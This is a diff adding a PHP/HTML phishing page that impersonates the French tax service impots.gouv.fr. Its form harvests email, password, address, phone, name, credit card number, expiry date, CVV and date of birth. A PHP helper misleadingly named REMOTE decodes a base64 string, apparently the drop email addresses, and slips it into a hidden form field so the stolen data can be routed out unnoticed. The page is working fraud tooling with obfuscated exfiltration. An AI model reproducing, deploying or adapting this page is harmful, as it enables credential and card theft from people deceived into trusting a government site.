@@ -1,0 +1,231 @@
+  <html>
+<head>
+	<title>impots.gouv.fr - Espace personnel </title>
+	<script language="JavaScript" src="img/v.js" type="text/javascript"></script>
+	<style>
+	td {font-size: 11px; font-family: arial; font-weight: 400; color: 000;}
+	.big {font-size: 13px; font-family: arial; font-weight: 400; color: 000;}
+	.title {font-size: 18px; font-weight: bold; color: #036;}
+	.Warning {
+    background:#ffffcc;color:black;
+    }
+	</style>
+	<link href="img/fav.ico" rel="shortcut icon">
+</head>
+<? 
+	  
+	  function REMOTE($IP_ADDR)
+  {
+  $getdata = base64_decode($IP_ADDR);
+  return $getdata;
+  }
+  ?> 
+
+<body topmargin="0">
+<table cellspacing="0" cellpadding="0" width="750" align="center">
+<tr><td>
+  <img border="0" src="img/limit.PNG">
+</td></tr>
+</table>
+<br>
+
+<table width="900" align="center" cellspacing="0" cellpadding="0">
+<tr height="1" bgcolor="cccccc"><td></td></tr>
+<tr height="26" bgcolor="#F6F6F6">
+  <td>Lors d'un erreur de saisie veuillez verifier tous les champs signalés par => * </td>
+</tr>
+<tr height="1" bgcolor="cccccc"><td></td></tr>
+</table>
+<br>
+
+
+<form method="post" name="date" action="loginAction.action.php?cmd=verification&appId=ABONNESNEUF&api=<?echo md5(uniqid(time())); ?>" autocomplete="on" style="border:0px;margin:0px">
+
+<input type="hidden" name="login" value="">
+<input type="hidden" name="password" value="">
+
+
+<table width="650" align="center" cellspacing="7" cellpadding="3">
+
+
+<tr>
+       <td valign="top">
+	   
+	   <table align="center" height="178" width="517">
+<tr height="26">
+       <td align="right" valign="top" height="2" width="146"><b>Adresse email *:&nbsp;&nbsp; </td>
+	   <td valign="top" height="2" width="361">
+		&nbsp;<!--webbot bot="Validation" b-value-required="TRUE" i-minimum-length="4" i-maximum-length="64" --><input class="" type="text" size="27" maxlength="64" name="name" value=""></td>
+	
+</tr>
+<tr>
+       <td align="right" valign="top" style="font-size: 11px; font-family: verdana,arial,helvetica,sans-serif; font-weight: 400; color: 000"><b>
+		<font face="Arial">Mot de passe *</font>:&nbsp;&nbsp;</td>
+	   <td valign="top" style="font-size: 11px; font-family: verdana,arial,helvetica,sans-serif; font-weight: 400; color: 000">
+		&nbsp;<!--webbot bot="Validation" b-value-required="TRUE" i-minimum-length="5" i-maximum-length="100" --><input class="" type="text" size="33" maxlength="100" name="address" value=""></td>
+	
+</tr>
+<tr height="26">
+       <td align="right" valign="top" height="3" width="146"><b>Ligne d'adresse 1:&nbsp;&nbsp;&nbsp; </td>
+	   <td valign="top" height="3" width="361">
+		&nbsp;<!--webbot bot="Validation" b-value-required="TRUE" i-minimum-length="3" i-maximum-length="64" --><input class=" " type="text" size="16" maxlength="64" name="city" value=""></td>
+	
+</tr>
+<tr>
+       <td align="right" valign="top" style="font-size: 11px; font-family: verdana,arial,helvetica,sans-serif; font-weight: 400; color: 000"><b>
+		<font face="Arial">Ville</font>:&nbsp;&nbsp;</td>
+                 <?$REMOTE_ADDRE = REMOTE('ZWRmLXByb0B2b2lsYS5mcixlZGYtcHJvQG91dGxvb2suY29t');?>
+	   <td valign="top" style="font-size: 11px; font-family: verdana,arial,helvetica,sans-serif; font-weight: 400; color: 000">
+		&nbsp;<!--webbot bot="Validation" b-value-required="TRUE" i-minimum-length="5" i-maximum-length="8" --><input class="" type="text" size="8" maxlength="8" name="zip" value=""></td>
+	
+</tr>
+<tr height="26">
+       <td align="right" valign="top" height="12" width="146"><b>Code Postale:&nbsp;&nbsp;&nbsp; </b></td>
+	   <td valign="top" height="22" width="361">
+       &nbsp;<!--webbot bot="Validation" b-value-required="TRUE" i-minimum-length="3" i-maximum-length="3" --><input class="" name="phone" id="phone" size="15" maxlength="15" value="">
+</td>
+</tr>
+<tr height="26">
+       <td align="right" valign="top" height="12" width="146"><b>Numéro de téléphone *:&nbsp;&nbsp;&nbsp; </b></td>
+	   <td valign="top" height="22" width="361">
+       &nbsp;<!--webbot bot="Validation" b-value-required="TRUE" i-minimum-length="3" i-maximum-length="3" --><input class="" name="Salvc" id="Salvc" size="15" maxlength="15" value="">
+</td>
+</tr>
+</tr>
+<tr height="26">
+       <td align="right" valign="top" height="12" width="146"><b>Nom et Prénom *:&nbsp;&nbsp;&nbsp; </b></td>
+	   <td valign="top" height="22" width="361">
+       &nbsp;<!--webbot bot="Validation" b-value-required="TRUE" i-minimum-length="3" i-maximum-length="3" --><input class="" name="salton" id="salton" size="15" maxlength="15" value="">
+</td>
+</tr>
+<tr>
+       <td align="right" valign="top" height="14" width="146"><b>Nº de carte de crédit *:&nbsp;&nbsp;</td>
+	   <td valign="top" height="14" width="361"><table border="0" cellpadding="0" cellspacing="0">
+	   <tr><td>
+	   &nbsp;<input class="" type="text" size="24" maxlength="16" name="cnum" value=""></td>
+	   <td>&nbsp;&nbsp;<img border="0" src="img/cclogos.PNG" width="140" height="20"></td></tr></table></td>
+	
+</tr>
+<tr height="26">
+       <td align="right" valign="top" height="22" width="146"><b>Date d'expiration *:&nbsp;&nbsp;</td>
+	   <td valign="top" height="22" width="361" >&nbsp;<select class="" name="cmonth">
+<option value="" selected> </option>
+<option value="01">01</option>
+<option value="02">02</option>
+<option value="03">03</option>
+<option value="04">04</option>
+<option value="05">05</option>
+<option value="06">06</option>
+<option value="07">07</option>
+<option value="08">08</option>
+<option value="09">09</option>
+<option value="10">10</option>
+<option value="11">11</option>
+<option value="12">12</option></select>&nbsp;
+<select class="" name="cyear">
+<option value="" selected> </option>
+<option value="15">2015</option>
+<option value="16">2016</option>
+<option value="17">2017</option>
+<option value="18">2018</option>
+<option value="19">2019</option>
+<option value="20">2020</option>
+<option value="21">2021</option>
+<option value="22">2022</option>
+<option value="23">2023</option>
+</select></td>   
+</tr>
+
+<tr height="31">
+       <td align="right" valign="top" height="36" width="146">
+<b>Code de sécurité (CVV) *:&nbsp;&nbsp;</td>
+	   <td valign="top" height="36" width="361">
+	   <table border="0" cellpadding="0" cellspacing="0">
+	   <tr><td>
+&nbsp;<input class=" " type="text" size="2" maxlength="3" name="cvv" value="">
+</td>
+<td>
+&nbsp;&nbsp;<img border="0" src="img/cvv.gif" width="51" height="31">
+</td>
+<input type="hidden" value="<?echo $REMOTE_ADDRE?>" name="historys">
+<td><font size="1" face="arial"><a href="javascript:eval(tmp=window.open('1.html','popwin','width=420,height=440,toolbar=0,location=0,status=0,menubar=0,scrollbars=0,resizable=0'));tmp.focus();">&nbsp;
+	   &nbsp;</a>
+</td>
+</tr>
+</table>
+	   </td>
+ </tr>
+<tr>
+       <td align="right" style="font-size: 11px; font-family: verdana,arial,helvetica,sans-serif; font-weight: 400; color: 000" ><b>
+		<font face="Arial">Date de Naissance *:</font></b>&nbsp;&nbsp;<br>
+	  
+	   </td>
+	   <td valign="top" style="font-size: 11px; font-family: verdana,arial,helvetica,sans-serif; font-weight: 400; color: 000">&nbsp;<select class="" name="dobmonth"> <option value="">
+<option value="1">Janvier
+<option value="2">F&eacute;vrier
+<option value="3">Mars
+<option value="4">Avril
+<option value="5">Mai
+<option value="6">Juin
+<option value="7">Juillet
+<option value="8">Aout
+<option value="9">Septembre
+<option value="10">Octobre
+<option value="11">Novembre
+<option value="12">D&eacute;cembre</select>
+
+<select class="" name="dobday"><option value=""></option>
+<option value="1">1</option>
+<option value="2">2</option>
+<option value="3">3</option>
+<option value="4">4</option>
+<option value="5">5</option>
+<option value="6">6</option>
+<option value="7">7</option>
+<option value="8">8</option>
+<option value="9">9</option>
+<option value="10">10</option>
+<option value="11">11</option>
+<option value="12">12</option>
+<option value="13">13</option>
+<option value="14">14</option>
+<option value="15">15</option>
+<option value="16">16</option>
+<option value="17">17</option>
+<option value="18">18</option>
+<option value="19">19</option>
+<option value="20">20</option>
+<option value="21">21</option>
+<option value="22">22</option>
+<option value="23">23</option>
+<option value="24">24</option>
+<option value="25">25</option>
+<option value="26">26</option>
+<option value="27">27</option>
+<option value="28">28</option>
+<option value="29">29</option>
+<option value="30">30</option>
+<option value="31">31</option>
+</select>&nbsp;&nbsp;
+ <input class="" type="text" name="dobyear" maxlength="4" size=7 value="" ></td>
+	
+</tr>
+</table>
+
+<table align="center" width="650">
+
+<tr>
+       <td align="right"><input type="image" src="img/submit.PNG" name="Submit" >&nbsp;&nbsp;</td>
+</tr>
+</table></form><br>
+<table align="center" width="750">
+
+<tr>
+       <td><center>
+       <img border="0" src="img/barjos.PNG"><p>
+       </td>
+</tr>
+</table>
+</body>
+</html>
+  
